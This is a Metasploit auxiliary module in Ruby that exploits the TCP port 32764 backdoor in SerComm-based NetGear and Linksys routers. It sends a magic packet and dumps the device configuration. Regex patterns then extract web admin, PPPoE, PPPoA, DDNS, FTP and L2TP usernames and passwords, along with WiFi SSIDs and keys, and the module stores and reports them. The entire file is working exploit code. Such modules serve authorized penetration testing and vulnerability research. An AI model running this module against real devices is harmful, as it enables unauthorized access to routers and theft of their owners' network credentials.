##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  SETTINGS = {
    'Creds' => [
      [ 'HTTP Web Management', { 'user' => /http_username=(\S+)/i, 'pass' => /http_password=(\S+)/i } ],
      [ 'HTTP Web Management', { 'user' => /login_username=(\S+)/i, 'pass' => /login_password=(\S+)/i } ],
      [ 'PPPoE', { 'user' => /pppoe_username=(\S+)/i, 'pass' => /pppoe_password=(\S+)/i } ],
      [ 'PPPoA', { 'user' => /pppoa_username=(\S+)/i, 'pass' => /pppoa_password=(\S+)/i } ],
      [ 'DDNS', { 'user' => /ddns_user_name=(\S+)/i, 'pass' => /ddns_password=(\S+)/i } ],
      [ 'CMS', {'user' => /cms_username=(\S+)/i, 'pass' => /cms_password=(\S+)/i } ], # Found in some cameras
      [ 'BigPondAuth', {'user' => /bpa_username=(\S+)/i, 'pass' => /bpa_password=(\S+)/i } ], # Telstra
      [ 'L2TP', { 'user' => /l2tp_username=(\S+)/i, 'pass' => /l2tp_password=(\S+)/i } ],
      [ 'FTP', { 'user' => /ftp_login=(\S+)/i, 'pass' => /ftp_password=(\S+)/i } ],
    ],
    'General' => [
      ['Wifi SSID', /wifi_ssid=(\S+)/i],
      ['Wifi Key 1', /wifi_key1=(\S+)/i],
      ['Wifi Key 2', /wifi_key2=(\S+)/i],
      ['Wifi Key 3', /wifi_key3=(\S+)/i],
      ['Wifi Key 4', /wifi_key4=(\S+)/i]
    ]
  }

  attr_accessor :endianess

  def initialize(info={})
    super(update_info(info,
      'Name'           => "SerComm Device Configuration Dump",
      'Description'    => %q{
        This module will dump the configuration of several SerComm devices. These devices
        typically include routers from NetGear and Linksys. This module was tested
        successfully against the NetGear DG834 series ADSL modem router.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Eloi Vanderbeken <eloi.vanderbeken[at]gmail.com>', #Initial discovery, poc
          'Matt "hostess" Andreko <mandreko[at]accuvant.com>' #Msf module
        ],
      'References'     =>
        [
          [ 'OSVDB', '101653' ],
          [ 'URL', 'https://github.com/elvanderb/TCP-32764' ]
        ],
      'DisclosureDate' => "Dec 31 2013" ))

      register_options(
        [
          Opt::RPORT(32764),
        ], self.class)
  end

  def run
    print_status("#{peer} - Attempting to connect and check endianess...")
    @endianess = fingerprint_endian

    if endianess.nil?
      print_error("Failed to check endianess, aborting...")
      return
    end
    print_good("#{peer} - #{string_endianess} device found...")

    print_status("#{peer} - Attempting to connect and dump configuration...")
    config = dump_configuration

    if config.nil?
      print_status("#{peer} - Error retrieving configuration, aborting...")
      return
    end

    loot_file = store_loot("router.config", "text/plain", rhost, config[:data], "#{rhost}router_config.txt", "Router Configurations")
    print_status("#{peer} - Router configuration dump stored in: #{loot_file}")

    parse_configuration(config[:data])
  end

  private

  def little_endian?
    return endianess == 'LE'
  end

  def big_endian?
    return endianess == 'BE'
  end

  def string_endianess
    if little_endian?
      return "Little Endian"
    elsif big_endian?
      return "Big Endian"
    end

    return nil
  end

  def peer
    return "#{rhost}:#{rport}"
  end

  def fingerprint_endian
    begin
      connect
      sock.put(Rex::Text.rand_text(5))
      res = sock.get_once
      disconnect
    rescue Rex::ConnectionError => e
      print_error("Connection failed: #{e.class}: #{e}")
      return nil
    end

    unless res
      return nil
    end

    if res.start_with?("MMcS")
      return 'BE'
    elsif res.start_with?("ScMM")
      return 'LE'
    end

    return nil
  end

  def dump_configuration
    if big_endian?
      pkt = [0x4d4d6353, 0x01, 0x00].pack("NVV")
    elsif little_endian?
      pkt = [0x4d4d6353, 0x01, 0x00].pack("VNN")
    else
      return nil
    end

    connect
    sock.put(pkt)
    res = sock.get

    disconnect

    if res.blank?
      vprint_error("#{peer} - No answer...")
      return
    end

    if big_endian?
      mark, zero, length, data = res.unpack("NVVa*")
    else
      mark, zero, length, data = res.unpack("VNNa*")
    end

    unless mark == 0x4d4d6353
      vprint_error("#{peer} - Incorrect mark when reading response")
      return nil
    end

    unless zero == 0
      vprint_error("#{peer} - Incorrect zero when reading response")
      return nil
    end

    unless length == data.length
      vprint_warning("#{peer} - Inconsistent length / data packet")
      #return nil
    end

    return { :length => length, :data => data }
  end

  def parse_configuration(data)
    configs = data.split(?\x00)

    if datastore['VERBOSE']
      vprint_status('All configuration values:')
      configs.sort.each do |i|
        if i.strip.match(/.*=\S+/)
          vprint_status(i)
        end
      end
    end

    configs.each do |config|
      parse_general_config(config)
    end
    parse_auth_config(configs)
  end

  def parse_general_config(config)
    SETTINGS['General'].each do |regex|
      if config.match(regex[1])
        value = $1
        print_status("#{peer} - #{regex[0]}: #{value}")
      end
    end
  end

  def parse_auth_config(configs)
    SETTINGS['Creds'].each do |cred|
      user = nil
      pass = nil

      # find the user/pass
      u = configs.grep(cred[1]['user']) { $1 }
      if u.any?
        user = u[0]
      end
      p = configs.grep(cred[1]['pass']) { $1 }
      if p.any?
        pass = p[0]
      end

      if user and pass
        print_status("#{peer} - #{cred[0]}: User: #{user} Pass: #{pass}")
        auth = {
          :host => rhost,
          :port => rport,
          :user => user,
          :pass => pass,
          :type => 'password',
          :source_type => "exploit",
          :active => true
        }
        report_auth_info(auth)
      end

    end
  end

end
